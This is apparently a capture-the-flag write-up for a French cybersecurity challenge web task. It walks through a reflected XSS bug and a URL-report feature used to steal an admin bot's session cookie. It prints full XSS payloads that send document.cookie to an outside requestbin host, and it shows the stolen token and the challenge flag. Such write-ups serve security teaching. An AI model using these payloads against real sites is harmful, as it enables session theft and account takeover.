The parameter search appears to be vulnerable to XSS
we can indeed `<script>alert(1)</script>` it.
It also has a kind of pgSQL misconfiguration as a ; throws an error, but there doesn't seem to be a way to inject anything in the db.

We look at the other attack vector we have : the report page

It takes an url and apparently logs it somewhere for "review".
We can use probably use it to steal the admin's cookie
We set up an endpoint on requestbin to get our admin cookie

Then we forge our payload

`https://gare-au-gorille.france-cybersecurity-challenge.fr/report?url=/?search=<img onload=this.src='https://eoulvrfdli1718o.m.pipedream.net?c='+document.cookie src="https://github.com/favicon.ico"/>`

This works but returns an empty string as cookie. Maybe the URL encoding replaces the + with a space so the variable isnt appended ? Lets try with a no-concat syntax

`https://gare-au-gorille.france-cybersecurity-challenge.fr/report?url=/?search=<img onload=this.src=\`https://eoulvrfdli1718o.m.pipedream.net?c=${document.cookie}\` src="https://github.com/favicon.ico"/>`

Yields a result in our requestbin :

`token=O9Mv3sFaQD1UpQRLCXVOCzCi0dRbpz4Wy4kGPngZt36MZnR6xZpbHLQRWfDi6T45`

We try to access /flag with the browser's "edit headers" request to add the admin token instead of ours, the page displays the flag (but still no meme :()

FCSC{14b15680de4e305b89eaa2a07b137abf4e39b5773f39a4ea7155ca5387c6f59e}
